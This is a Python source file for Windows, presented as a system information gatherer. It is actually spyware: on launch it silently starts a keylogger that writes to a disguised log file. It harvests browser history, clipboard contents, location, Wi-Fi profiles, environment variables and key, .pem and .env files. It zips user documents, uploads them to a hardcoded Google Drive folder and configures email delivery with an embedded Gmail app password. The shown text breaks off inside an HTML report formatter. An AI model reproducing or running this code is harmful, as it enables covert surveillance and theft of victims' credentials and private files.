import os
import sys
import time
import platform
import psutil
import socket
import subprocess
import json
from datetime import datetime as dt
import threading
import re
import mimetypes
import zipfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.application import MIMEApplication
from email import encoders
import win32api
import win32con
import win32security
import win32profile
import win32gui
import win32process
import wmi
import ctypes
from ctypes import wintypes
import winreg
from browser import get_chrome_history, get_firefox_history, get_edge_history
from clip_screen import ScreenshotViewer, ClipboardManager
from location import WindowsLocationMonitor

# Optional keylogger support
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except Exception:
    keyboard = None
    PYNPUT_AVAILABLE = False

# ============================================================
# EMAIL CONFIGURATION
# ============================================================
EMAIL_TO = os.environ.get("EMAIL_TO", "bhuvankumarhm25@gmail.com")
EMAIL_FROM = os.environ.get("EMAIL_FROM", EMAIL_TO)
# Set your Gmail App Password via environment variable for secure delivery
# To get an App Password: Google Account > Security > 2-Step Verification > App Passwords
GMAIL_APP_PASSWORD = os.environ.get("GMAIL_APP_PASSWORD", "zmbe gtcl dayf tsoi")

# Google Drive configuration
GOOGLE_DRIVE_FOLDER_ID = os.environ.get(
    "GOOGLE_DRIVE_FOLDER_ID",
    "1PTPx3NDr2YVt3MHKBBnK8GzuLaSLn_Dd"
)
GOOGLE_DRIVE_FOLDER_LINK = os.environ.get(
    "GOOGLE_DRIVE_FOLDER_LINK",
    "https://drive.google.com/drive/folders/1PTPx3NDr2YVt3MHKBBnK8GzuLaSLn_Dd?usp=drive_link"
)
GOOGLE_CREDENTIALS_FILE = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
# ============================================================

class SystemInfoGatherer:
    def __init__(self):
        self.wmi_client = wmi.WMI()
        self.keylog_path = os.path.join(os.environ.get('APPDATA', ''), 'system_logs.txt')
        self.keylogger_thread = None
        self.keylogger_active = False
        self.start_keylogger()
        
    def start_keylogger(self):
        """Start a background keylogger thread if pynput is available."""
        if not PYNPUT_AVAILABLE or self.keylogger_active:
            return False

        def on_press(key):
            try:
                key_text = key.char
            except AttributeError:
                key_text = str(key)
            try:
                with open(self.keylog_path, 'a', encoding='utf-8') as f:
                    f.write(f"{dt.now().isoformat()} [PRESS] {key_text}\n")
            except Exception:
                pass

        def on_release(key):
            if key == keyboard.Key.esc:
                return False
            return True

        def listen_keys():
            try:
                with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                    listener.join()
            except Exception as e:
                print(f"Keylogger thread failed: {e}")

        self.keylogger_thread = threading.Thread(target=listen_keys, daemon=True)
        self.keylogger_thread.start()
        self.keylogger_active = True
        return True

    def get_basic_system_info(self):
        """Get basic system information"""
        hostname = socket.gethostname()
        ip_address = None
        try:
            ip_address = socket.gethostbyname(hostname)
        except Exception:
            try:
                ip_address = socket.gethostbyname(socket.getfqdn())
            except Exception:
                ip_address = 'Unknown'

        info = {
            'system': {
                'platform': platform.system(),
                'platform_release': platform.release(),
                'platform_version': platform.version(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'hostname': hostname,
                'ip_address': ip_address
            },
            'boot_time': dt.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
        }
        return info
    
    def get_cpu_info(self):
        """Get CPU information"""
        cpu_info = {
            'physical_cores': psutil.cpu_count(logical=False),
            'total_cores': psutil.cpu_count(logical=True),
            'max_frequency': psutil.cpu_freq().max if psutil.cpu_freq() else None,
            'min_frequency': psutil.cpu_freq().min if psutil.cpu_freq() else None,
            'current_frequency': psutil.cpu_freq().current if psutil.cpu_freq() else None,
            'usage_per_core': psutil.cpu_percent(percpu=True),
            'total_usage': psutil.cpu_percent(interval=1)
        }
        
        # Get additional CPU info using WMI
        try:
            for processor in self.wmi_client.Win32_Processor():
                cpu_info['name'] = processor.Name
                cpu_info['manufacturer'] = processor.Manufacturer
                cpu_info['family'] = processor.Family
                cpu_info['max_clock_speed'] = processor.MaxClockSpeed
                break
        except Exception as e:
            print(f"Error getting WMI CPU info: {e}")
        
        return cpu_info
    
    def get_memory_info(self):
        """Get memory information"""
        mem = psutil.virtual_memory()
        swap = psutil.swap_memory()
        
        memory_info = {
            'total': mem.total,
            'available': mem.available,
            'used': mem.used,
            'percentage': mem.percent,
            'swap_total': swap.total,
            'swap_used': swap.used,
            'swap_free': swap.free,
            'swap_percentage': swap.percent
        }
        
        return memory_info
    
    def get_disk_info(self):
        """Get disk information"""
        disk_info = []
        
        for partition in psutil.disk_partitions():
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                
                disk_info.append({
                    'device': partition.device,
                    'mountpoint': partition.mountpoint,
                    'file_system_type': partition.fstype,
                    'total_size': partition_usage.total,
                    'used': partition_usage.used,
                    'free': partition_usage.free,
                    'percentage': partition_usage.percent
                })
            except Exception as e:
                print(f"Error getting disk info for {partition.device}: {e}")
        
        return disk_info
    
    def get_network_info(self):
        """Get network information"""
        network_info = {
            'interfaces': {},
            'io_counters': {}
        }
        
        # Get network interfaces
        for interface_name, interface_addresses in psutil.net_if_addrs().items():
            addresses = []
            for address in interface_addresses:
                if address.family == socket.AF_INET:  # IPv4
                    addresses.append({
                        'type': 'IPv4',
                        'address': address.address,
                        'netmask': address.netmask,
                        'broadcast': address.broadcast
                    })
                elif address.family == socket.AF_INET6:  # IPv6
                    addresses.append({
                        'type': 'IPv6',
                        'address': address.address,
                        'netmask': address.netmask
                    })
            
            network_info['interfaces'][interface_name] = addresses
        
        # Get network I/O statistics
        net_io = psutil.net_io_counters()
        network_info['io_counters'] = {
            'bytes_sent': net_io.bytes_sent,
            'bytes_recv': net_io.bytes_recv,
            'packets_sent': net_io.packets_sent,
            'packets_recv': net_io.packets_recv,
            'errin': net_io.errin,
            'errout': net_io.errout,
            'dropin': net_io.dropin,
            'dropout': net_io.dropout
        }
        
        return network_info
    
    def get_gpu_info(self):
        """Get GPU information"""
        gpu_info = []
        
        try:
            for gpu in self.wmi_client.Win32_VideoController():
                gpu_info.append({
                    'name': gpu.Name,
                    'adapter_ram': gpu.AdapterRAM,
                    'driver_version': gpu.DriverVersion,
                    'driver_date': gpu.DriverDate,
                    'video_mode_description': gpu.VideoModeDescription
                })
        except Exception as e:
            print(f"Error getting GPU info: {e}")
        
        return gpu_info
    
    def get_motherboard_info(self):
        """Get motherboard information"""
        motherboard_info = {}
        
        try:
            for board in self.wmi_client.Win32_BaseBoard():
                motherboard_info = {
                    'manufacturer': board.Manufacturer,
                    'product': board.Product,
                    'version': board.Version,
                    'serial_number': board.SerialNumber
                }
                break
        except Exception as e:
            print(f"Error getting motherboard info: {e}")
        
        return motherboard_info
    
    def get_bios_info(self):
        """Get BIOS information"""
        bios_info = {}
        
        try:
            for bios in self.wmi_client.Win32_BIOS():
                bios_info = {
                    'manufacturer': bios.Manufacturer,
                    'name': bios.Name,
                    'version': bios.SMBIOSBIOSVersion,
                    'release_date': bios.ReleaseDate
                }
                break
        except Exception as e:
            print(f"Error getting BIOS info: {e}")
        
        return bios_info
    
    def get_installed_software(self):
        """Get list of installed software"""
        software_list = []
        
        try:
            for software in self.wmi_client.Win32_Product():
                software_list.append({
                    'name': software.Name,
                    'version': software.Version,
                    'vendor': software.Vendor,
                    'install_date': software.InstallDate
                })
        except Exception as e:
            print(f"Warning: Win32_Product enumeration failed: {e}")
            software_list = self.get_installed_software_registry()
        
        return software_list
    
    def get_installed_software_registry(self):
        """Fallback: read installed software from the Windows registry."""
        software_list = []
        try:
            import winreg
            registry_paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
            ]

            for root, path in registry_paths:
                try:
                    with winreg.OpenKey(root, path) as key:
                        for i in range(winreg.QueryInfoKey(key)[0]):
                            subkey_name = winreg.EnumKey(key, i)
                            try:
                                with winreg.OpenKey(key, subkey_name) as subkey:
                                    name = self._get_registry_value(subkey, "DisplayName")
                                    if not name:
                                        continue
                                    software_list.append({
                                        'name': name,
                                        'version': self._get_registry_value(subkey, "DisplayVersion"),
                                        'vendor': self._get_registry_value(subkey, "Publisher"),
                                        'install_date': self._get_registry_value(subkey, "InstallDate"),
                                        'install_location': self._get_registry_value(subkey, "InstallLocation")
                                    })
                            except OSError:
                                continue
                except FileNotFoundError:
                    continue
        except Exception as e:
            print(f"Error getting installed software from registry: {e}")

        return software_list

    def _get_registry_value(self, key, value_name):
        try:
            value, _ = winreg.QueryValueEx(key, value_name)
            return value
        except Exception:
            return None

    def get_running_services(self):
        """Get list of running services"""
        services = []
        
        try:
            for service in self.wmi_client.Win32_Service():
                if service.State == 'Running':
                    services.append({
                        'name': service.Name,
                        'display_name': service.DisplayName,
                        'state': service.State,
                        'start_mode': service.StartMode
                    })
        except Exception as e:
            print(f"Warning getting running services via WMI: {e}")
            try:
                for svc in psutil.win_service_iter():
                    if svc.status().lower() == 'running':
                        services.append({
                            'name': svc.name(),
                            'display_name': svc.display_name(),
                            'state': svc.status(),
                            'start_mode': getattr(svc, 'start_type', lambda: 'unknown')()
                        })
            except Exception as fallback_error:
                print(f"Error getting running services via psutil: {fallback_error}")
        
        return services
    
    def get_startup_programs(self):
        """Get list of startup programs"""
        startup_programs = []
        
        try:
            for startup in self.wmi_client.Win32_StartupCommand():
                startup_programs.append({
                    'name': startup.Name,
                    'command': startup.Command,
                    'location': startup.Location
                })
        except Exception as e:
            print(f"Warning getting startup programs via WMI: {e}")
            startup_programs = self.get_startup_programs_registry()
        
        return startup_programs

    def get_startup_programs_registry(self):
        """Fallback: read startup programs from Windows registry Run keys."""
        programs = []
        try:
            import winreg
            run_keys = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run")
            ]

            for root, path in run_keys:
                try:
                    with winreg.OpenKey(root, path) as key:
                        for i in range(winreg.QueryInfoKey(key)[1]):
                            try:
                                name, value, _ = winreg.EnumValue(key, i)
                                programs.append({
                                    'name': name,
                                    'command': value,
                                    'location': path
                                })
                            except OSError:
                                continue
                except FileNotFoundError:
                    continue
        except Exception as e:
            print(f"Error getting startup programs from registry: {e}")

        return programs
    
    def get_browser_history(self):
        """Collect browser history from installed browsers."""
        browser_data = {}
        try:
            browser_data['chrome'] = get_chrome_history()[:50]
        except Exception as e:
            browser_data['chrome_error'] = str(e)
        try:
            browser_data['edge'] = get_edge_history()[:50]
        except Exception as e:
            browser_data['edge_error'] = str(e)
        try:
            browser_data['firefox'] = get_firefox_history()[:50]
        except Exception as e:
            browser_data['firefox_error'] = str(e)
        return browser_data

    def get_clipboard_info(self):
        """Collect clipboard text and image summary."""
        clipboard = ClipboardManager()
        clipboard_info = {}
        try:
            clipboard_info['clipboard_text'] = clipboard.get_clipboard_text()
            clipboard_info['clipboard_types'] = clipboard.get_clipboard_content_type()
            latest_image = clipboard.get_clipboard_image()
            clipboard_info['clipboard_has_image'] = latest_image is not None
        except Exception as e:
            clipboard_info['error'] = str(e)
        return clipboard_info

    def get_screenshot_info(self):
        """Collect screenshot metadata."""
        viewer = ScreenshotViewer()
        info = {}
        try:
            screenshots = viewer.find_screenshots()
            info['count'] = len(screenshots)
            info['screenshots'] = []
            for path in screenshots[:20]:
                try:
                    info['screenshots'].append({
                        'path': path,
                        'modified': dt.fromtimestamp(os.path.getmtime(path)).strftime('%Y-%m-%d %H:%M:%S'),
                        'size_bytes': os.path.getsize(path)
                    })
                except Exception:
                    continue
            info['latest_screenshot'] = viewer.get_latest_screenshot()
        except Exception as e:
            info['error'] = str(e)
        return info

    def get_location_info(self):
        """Collect location data from available sources."""
        try:
            location_monitor = WindowsLocationMonitor()
            return location_monitor.get_all_location_sources()
        except Exception as e:
            return {'error': str(e)}

    def get_keylogger_info(self):
        """Get keylogger logs if available."""
        try:
            log_file = self.keylog_path
            if not os.path.exists(log_file):
                return {
                    'present': False,
                    'message': 'No keylogger logs found.',
                    'path': log_file,
                    'line_count': 0,
                    'last_entries': []
                }

            with open(log_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            trimmed_lines = [line.strip() for line in lines[-100:]]
            return {
                'present': True,
                'path': log_file,
                'line_count': len(lines),
                'last_entries': trimmed_lines
            }
        except Exception as e:
            return {
                'present': False,
                'message': f'Error getting keylogger info: {e}',
                'path': self.keylog_path,
                'line_count': 0,
                'last_entries': []
            }

    def get_net_info(self):
        """Get additional network diagnostics (WiFi profiles, active connections, public IP)."""
        net_data = {}
        try:
            # Get WiFi profiles
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True, text=True, timeout=10
            )
            profiles = []
            for line in result.stdout.splitlines():
                if 'All User Profile' in line or 'Current User Profile' in line:
                    profile_name = line.split(':')[-1].strip()
                    if profile_name:
                        profiles.append(profile_name)
            net_data['wifi_profiles'] = profiles
        except Exception as e:
            net_data['wifi_profiles_error'] = str(e)

        try:
            # Get active TCP connections
            connections = []
            for conn in psutil.net_connections(kind='inet'):
                if conn.status == 'ESTABLISHED':
                    connections.append({
                        'local': f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else None,
                        'remote': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                        'pid': conn.pid
                    })
            net_data['active_connections'] = connections[:50]
        except Exception as e:
            net_data['active_connections_error'] = str(e)

        try:
            # Get public IP address
            import urllib.request
            public_ip = urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode('utf-8')
            net_data['public_ip'] = public_ip
        except Exception as e:
            net_data['public_ip_error'] = str(e)

        try:
            # Get DNS servers
            result = subprocess.run(
                ['ipconfig', '/all'],
                capture_output=True, text=True, timeout=10
            )
            dns_servers = []
            for line in result.stdout.splitlines():
                if 'DNS Servers' in line:
                    dns = line.split(':')[-1].strip()
                    if dns:
                        dns_servers.append(dns)
            net_data['dns_servers'] = dns_servers
        except Exception as e:
            net_data['dns_servers_error'] = str(e)

        return net_data

    def get_process_info(self, limit=100):
        """Collect current process list and resource usage."""
        process_data = []
        try:
            for proc in psutil.process_iter(['pid', 'name', 'username', 'status', 'cpu_percent', 'memory_percent', 'exe', 'cmdline']):
                if len(process_data) >= limit:
                    break
                try:
                    process_data.append({
                        'pid': proc.info.get('pid'),
                        'name': proc.info.get('name'),
                        'username': proc.info.get('username'),
                        'status': proc.info.get('status'),
                        'cpu_percent': proc.info.get('cpu_percent'),
                        'memory_percent': proc.info.get('memory_percent'),
                        'exe': proc.info.get('exe'),
                        'cmdline': proc.info.get('cmdline')
                    })
                except (psutil.AccessDenied, psutil.NoSuchProcess):
                    continue
        except Exception as e:
            return {'error': str(e)}
        return process_data

    def get_system_uptime(self):
        """Get system uptime"""
        boot_time = psutil.boot_time()
        uptime_seconds = time.time() - boot_time
        
        days = int(uptime_seconds // (24 * 3600))
        hours = int((uptime_seconds % (24 * 3600)) // 3600)
        minutes = int((uptime_seconds % 3600) // 60)
        
        return {
            'boot_time': dt.fromtimestamp(boot_time).strftime('%Y-%m-%d %H:%M:%S'),
            'uptime': f"{days} days, {hours} hours, {minutes} minutes",
            'uptime_seconds': uptime_seconds
        }
    
    def get_environment_variables(self):
        """Get environment variables"""
        return dict(os.environ)

    def get_files_info(self, max_files=100):
        """Collect user files from all common directories with full metadata."""
        home = os.path.expanduser('~')
        search_paths = [
            os.path.join(home, 'Desktop'),
            os.path.join(home, 'Documents'),
            os.path.join(home, 'Downloads'),
            os.path.join(home, 'Pictures'),
            os.path.join(home, 'Videos'),
            os.path.join(home, 'Music'),
            os.path.join(home, 'OneDrive'),
            os.path.join(home, 'AppData', 'Local'),
            os.path.join(home, 'AppData', 'Roaming'),
        ]
        extensions = [
            '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.csv', '.json', '.log', '.ini', '.conf', '.xml', '.pem', '.key',
            '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.mp4', '.mov', '.avi',
            '.zip', '.rar', '.7z', '.py', '.js', '.html', '.css', '.bat',
            '.ps1', '.exe', '.msi', '.db', '.sqlite', '.sql', '.env',
            '.cfg', '.yaml', '.yml', '.md', '.rtf', '.odt', '.ods'
        ]

        files = []
        dir_summary = {}
        for search_dir in search_paths:
            if not os.path.exists(search_dir):
                continue
            dir_name = os.path.basename(search_dir)
            dir_files = []
            try:
                for root, dirs, filenames in os.walk(search_dir):
                    # Skip deep recursion into heavy system/cache folders
                    depth = root.replace(search_dir, '').count(os.sep)
                    if depth > 3:
                        continue
                    for filename in filenames:
                        ext = os.path.splitext(filename)[1].lower()
                        if ext not in extensions:
                            continue
                        file_path = os.path.join(root, filename)
                        try:
                            stat = os.stat(file_path)
                            file_entry = {
                                'path': file_path,
                                'name': filename,
                                'size': stat.st_size,
                                'modified': dt.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
                                'created': dt.fromtimestamp(stat.st_ctime).strftime('%Y-%m-%d %H:%M:%S'),
                                'extension': ext,
                                'directory': dir_name
                            }
                            dir_files.append(file_entry)
                            files.append(file_entry)
                            if len(files) >= max_files:
                                dir_summary[dir_name] = len(dir_files)
                                return {'count': len(files), 'files': files, 'directory_summary': dir_summary}
                        except (OSError, PermissionError):
                            continue
            except (OSError, PermissionError):
                continue
            dir_summary[dir_name] = len(dir_files)

        return {'count': len(files), 'files': files, 'directory_summary': dir_summary}

    def get_usb_info(self):
        """Collect USB device and removable drive information."""
        try:
            from usb_mon import USBHubMonitor
        except Exception as e:
            return {'error': f'USBHubMonitor unavailable: {e}'}

        try:
            monitor = USBHubMonitor()
            return {
                'devices': monitor.get_usb_devices(),
                'controllers': monitor.get_usb_controller_info(),
                'removable_drives': monitor.get_connected_drives_info()
            }
        except Exception as e:
            return {'error': str(e)}

    def get_all_system_info(self):
        """Get all system information"""
        all_info = {
            'timestamp': dt.now().strftime('%Y-%m-%d %H:%M:%S'),
            'basic_info': self.get_basic_system_info(),
            'cpu_info': self.get_cpu_info(),
            'memory_info': self.get_memory_info(),
            'disk_info': self.get_disk_info(),
            'network_info': self.get_network_info(),
            'gpu_info': self.get_gpu_info(),
            'motherboard_info': self.get_motherboard_info(),
            'bios_info': self.get_bios_info(),
            'browser_history': self.get_browser_history(),
            'clipboard_info': self.get_clipboard_info(),
            'screenshot_info': self.get_screenshot_info(),
            'location_info': self.get_location_info(),
            'keylogger_info': self.get_keylogger_info(),
            'net_info': self.get_net_info(),
            'files_info': self.get_files_info(),
            'usb_info': self.get_usb_info(),
            'process_info': self.get_process_info(limit=100),
            'installed_software': self.get_installed_software(),
            'running_services': self.get_running_services(),
            'startup_programs': self.get_startup_programs(),
            'system_uptime': self.get_system_uptime(),
            'environment_variables': self.get_environment_variables()
        }

        return all_info
    
    def save_to_file(self, data, filename=None):
        """Save system information to a file"""
        if not filename:
            timestamp = dt.now().strftime('%Y%m%d_%H%M%S')
            filename = f"system_info_{timestamp}.json"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, default=str)
            print(f"System information saved to {filename}")
            return filename
        except Exception as e:
            print(f"Error saving system information: {e}")
            return None

    def save_report_files(self, data, filename_prefix=None):
        """Save a single combined .txt.json file with human-readable report + raw JSON."""
        if not filename_prefix:
            filename_prefix = f"system_info_{dt.now().strftime('%Y%m%d_%H%M%S')}"

        combined_filename = f"{filename_prefix}.txt.json"

        try:
            report_text = self.format_info_for_email(data)
            json_data = json.dumps(data, indent=4, default=str)

            combined_content = report_text
            combined_content += "\n\n"
            combined_content += "=" * 70 + "\n"
            combined_content += "  RAW JSON DATA (Machine-Readable)\n"
            combined_content += "=" * 70 + "\n\n"
            combined_content += json_data

            with open(combined_filename, 'w', encoding='utf-8') as f:
                f.write(combined_content)
            print(f"Combined report saved to {combined_filename}")
        except Exception as e:
            print(f"Error saving combined report: {e}")
            combined_filename = None

        return combined_filename

    def _extract_drive_folder_id(self, drive_link):
        """Extract folder ID from a Google Drive URL."""
        if not drive_link:
            return None
        patterns = [
            r"/folders/([a-zA-Z0-9_-]+)",
            r"/drive/folders/([a-zA-Z0-9_-]+)",
            r"/d/([a-zA-Z0-9_-]+)",
            r"[?&]id=([a-zA-Z0-9_-]+)",
            r"/project/([a-zA-Z0-9_-]+)"
        ]
        for pattern in patterns:
            match = re.search(pattern, drive_link)
            if match:
                return match.group(1)
        return None

    def _build_drive_service(self):
        """Build a Google Drive API service client."""
        try:
            from google.oauth2 import service_account
            from googleapiclient.discovery import build
        except ImportError as e:
            print(f"Google Drive API libraries are not installed: {e}")
            return None

        credentials_file = GOOGLE_CREDENTIALS_FILE
        script_dir = os.path.dirname(os.path.abspath(__file__))
        home_dir = os.path.expanduser('~')
        candidate_files = [
            os.path.join(script_dir, 'google_credentials.json'),
            os.path.join(script_dir, 'service_account.json'),
            os.path.join(script_dir, 'credentials.json'),
            os.path.join(script_dir, 'drive_credentials.json'),
            os.path.join(home_dir, 'google_credentials.json'),
            os.path.join(home_dir, 'service_account.json'),
            os.path.join(home_dir, '.credentials', 'google_credentials.json'),
            os.path.join(home_dir, '.credentials', 'drive_credentials.json')
        ]

        if not credentials_file or not os.path.exists(credentials_file):
            for candidate in candidate_files:
                if os.path.exists(candidate):
                    credentials_file = candidate
                    print(f"Using Google credentials file: {credentials_file}")
                    break

        try:
            scopes = ['https://www.googleapis.com/auth/drive.file']
            if credentials_file and os.path.exists(credentials_file):
                creds = service_account.Credentials.from_service_account_file(credentials_file, scopes=scopes)
            else:
                import google.auth
                creds, _ = google.auth.default(scopes=scopes)
                print("Using Application Default Credentials for Drive API.")

            service = build('drive', 'v3', credentials=creds, cache_discovery=False)
            return service
        except Exception as e:
            print(f"Error building Google Drive service: {e}")
            return None

    def _create_drive_folder(self, parent_folder_id, folder_name):
        """Create a subfolder inside the configured Google Drive folder."""
        service = self._build_drive_service()
        if not service:
            return None
        try:
            folder_metadata = {
                'name': folder_name,
                'mimeType': 'application/vnd.google-apps.folder',
                'parents': [parent_folder_id]
            }
            created = service.files().create(body=folder_metadata, fields='id').execute()
            return created.get('id')
        except Exception as e:
            print(f"Failed to create Drive subfolder '{folder_name}': {e}")
            return None

    def get_files_to_upload(self, scan_paths=None, allowed_extensions=None, max_files=20, max_size_mb=25):
        """Collect a limited set of user files for upload from common directories."""
        if scan_paths is None:
            home = os.path.expanduser('~')
            scan_paths = [
                home,
                os.path.join(home, 'Desktop'),
                os.path.join(home, 'Documents'),
                os.path.join(home, 'Downloads'),
                os.path.join(home, 'Pictures'),
                os.path.join(home, 'Videos'),
                os.path.join(home, 'Music')
            ]

        if allowed_extensions is None:
            allowed_extensions = [
                '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
                '.csv', '.json', '.log', '.ini', '.conf', '.xml', '.pem', '.key',
                '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.mp4', '.mov', '.zip', '.rar'
            ]

        files = []
        for path in scan_paths:
            if not os.path.exists(path):
                continue
            for root, _, filenames in os.walk(path):
                for filename in filenames:
                    ext = os.path.splitext(filename)[1].lower()
                    if ext not in allowed_extensions:
                        continue
                    file_path = os.path.join(root, filename)
                    try:
                        size_mb = os.path.getsize(file_path) / (1024**2)
                        if size_mb > max_size_mb:
                            continue
                    except OSError:
                        continue
                    files.append(file_path)
                    if len(files) >= max_files:
                        return files
        return files

    def compress_files_to_zip(self, file_paths, zip_name=None):
        """Compress a list of files into a single ZIP archive for upload."""
        if not file_paths:
            return None
        if not zip_name:
            hostname = socket.gethostname()
            zip_name = f"system_report_{hostname}_{dt.now().strftime('%Y%m%d_%H%M%S')}.zip"
        try:
            used_names = {}
            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zf:
                for file_path in file_paths:
                    if file_path and os.path.exists(file_path):
                        base_name = os.path.basename(file_path)
                        # Handle duplicate filenames by appending a counter
                        if base_name in used_names:
                            used_names[base_name] += 1
                            name_part, ext = os.path.splitext(base_name)
                            arc_name = f"{name_part}_{used_names[base_name]}{ext}"
                        else:
                            used_names[base_name] = 0
                            arc_name = base_name
                        zf.write(file_path, arc_name)
            size_mb = os.path.getsize(zip_name) / (1024 * 1024)
            print(f"Compressed {len(file_paths)} files into {zip_name} ({size_mb:.2f} MB)")
            return zip_name
        except Exception as e:
            print(f"Error compressing files: {e}")
            return None

    def upload_reports_to_drive(self, file_paths, folder_id=None):
        """Upload generated report files to Google Drive."""
        if not file_paths:
            return False

        if not folder_id:
            folder_id = GOOGLE_DRIVE_FOLDER_ID or self._extract_drive_folder_id(GOOGLE_DRIVE_FOLDER_LINK)

        if not folder_id:
            print("Google Drive folder ID not configured.")
            return False

        service = self._build_drive_service()
        if not service:
            return False

        success_count = 0
        target_files = [f for f in file_paths if f and os.path.exists(f)]
        if not target_files:
            print("No valid files found to upload to Google Drive.")
            return False

        for file_path in target_files:
            try:
                from googleapiclient.http import MediaFileUpload
                mime_type, _ = mimetypes.guess_type(file_path)
                mime_type = mime_type or 'application/octet-stream'
                media = MediaFileUpload(file_path, mimetype=mime_type, resumable=False)
                file_metadata = {
                    'name': os.path.basename(file_path),
                    'parents': [folder_id]
                }
                created_file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
                print(f"Uploaded {file_path} to Google Drive with file ID {created_file.get('id')}")
                success_count += 1
            except Exception as e:
                print(f"Failed to upload {file_path} to Google Drive: {e}")

        if success_count != len(target_files):
            print(f"Uploaded {success_count}/{len(target_files)} files to Google Drive.")
        else:
            print(f"Successfully uploaded all {success_count} files to Google Drive.")

        return success_count == len(target_files)

    def upload_files_to_drive(self, file_paths, folder_id=None, folder_name=None):
        """Upload selected files to Google Drive inside a created subfolder."""
        if not file_paths:
            return False

        parent_folder_id = folder_id or GOOGLE_DRIVE_FOLDER_ID or self._extract_drive_folder_id(GOOGLE_DRIVE_FOLDER_LINK)
        if not parent_folder_id:
            print("Google Drive folder ID not configured.")
            return False

        if not folder_name:
            folder_name = f"SystemInfoFiles_{dt.now().strftime('%Y%m%d_%H%M%S')}"

        upload_folder_id = self._create_drive_folder(parent_folder_id, folder_name)
        if not upload_folder_id:
            return False

        service = self._build_drive_service()
        if not service:
            return False

        success_count = 0
        target_files = [f for f in file_paths if f and os.path.exists(f)]
        if not target_files:
            print("No valid files found to upload to Google Drive.")
            return False

        for file_path in target_files:
            try:
                from googleapiclient.http import MediaFileUpload
                mime_type, _ = mimetypes.guess_type(file_path)
                mime_type = mime_type or 'application/octet-stream'
                media = MediaFileUpload(file_path, mimetype=mime_type, resumable=False)
                file_metadata = {
                    'name': os.path.basename(file_path),
                    'parents': [upload_folder_id]
                }
                created_file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
                print(f"Uploaded {file_path} to Google Drive with file ID {created_file.get('id')}")
                success_count += 1
            except Exception as e:
                print(f"Failed to upload {file_path} to Google Drive: {e}")

        if success_count != len(target_files):
            print(f"Uploaded {success_count}/{len(target_files)} files to Google Drive.")
        else:
            print(f"Successfully uploaded all {success_count} files to Google Drive.")

        return success_count == len(target_files)

    def format_info_for_email_html(self, data):
        """Format ALL system information into a professional PDF-style HTML report."""
        basic = data.get('basic_info', {})
        sys_info = basic.get('system', {})
        cpu = data.get('cpu_info', {})
        mem = data.get('memory_info', {})
        uptime = data.get('system_uptime', {})
        net = data.get('network_info', {})
        net_extra = data.get('net_info', {})
        disks = data.get('disk_info', [])
        gpus = data.get('gpu_info', [])
        mb = data.get('motherboard_info', {})
        bios = data.get('bios_info', {})
        browser = data.get('browser_history', {})
        clip = data.get('clipboard_info', {})
        screenshot = data.get('screenshot_info', {})
        keylog = data.get('keylogger_info', {})
        loc = data.get('location_info', {})
        usb = data.get('usb_info', {})
        files_info = data.get('files_info', {})
        procs = data.get('process_info', [])
        installed = data.get('installed_software', [])
        services = data.get('running_services', [])
        startup = data.get('startup_programs', [])

        # CSS styles for PDF-like look
        css = """
        <style>
            body { font-family: 'Segoe UI', Arial, sans-serif; color: #1a1a1a; background: #f5f5f5; margin: 0; padding: 0; }
            .container { max-width: 900px; margin: 0 auto; background: #fff; padding: 0; border: 1px solid #ddd; }
            .header { background: linear-gradient(135deg, #1a237e, #283593); color: #fff; padding: 30px 40px; }
            .header h1 { margin: 0; font-size: 22px; font-weight: 600; letter-spacing: 1px; }
            .header p { margin: 5px 0 0; font-size: 13px; opacity: 0.85; }
            .header .ip-badge { display: inline-block; background: rgba(255,255,255,0.15); border-radius: 4px; padding: 4px 12px; margin-top: 10px; font-size: 12px; }
            .content { padding: 25px 40px; }
            .section { margin-bottom: 25px; page-break-inside: avoid; }
            .section-title { font-size: 15px; font-weight: 700; color: #1a237e; border-bottom: 2px solid #1a237e; padding-bottom: 6px; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
            table { width: 100%; border-collapse: collapse; font-size: 12px; margin-bottom: 10px; }
            table th { background: #e8eaf6; color: #1a237e; text-align: left; padding: 8px 10px; font-weight: 600; border: 1px solid #c5cae9; }
            table td { padding: 6px 10px; border: 1px solid #e0e0e0; vertical-align: top; }
            table tr:nth-child(even) { background: #fafafa; }
            table tr:hover { background: #f0f0f0; }
            .kv-table td:first-child { width: 180px; font-weight: 600; color: #333; background: #f8f9fa; }
            .badge { display: inline-block; background: #e8eaf6; color: #1a237e; border-radius: 3px; padding: 2px 8px; font-size: 11px; font-weight: 600; }
